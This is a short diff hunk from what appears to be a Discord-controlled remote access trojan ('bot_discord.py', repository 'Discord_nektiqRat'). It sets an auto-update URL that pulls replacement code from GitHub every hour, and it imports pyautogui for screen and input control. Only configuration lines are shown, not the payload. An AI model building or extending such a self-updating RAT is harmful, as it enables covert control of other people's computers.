@@ -30,7 +30,7 @@ import pyautogui
 TOKEN = ""
 
 # GitHub raw URL для автооновлення
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/youruser/yourrepo/main/bot_discord.py"
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/myst1112/Discord_nektiqRat/main/bot_discord.py"
 UPDATE_INTERVAL = 3600  # перевіряти раз на годину
 
 PREFIX = "!"
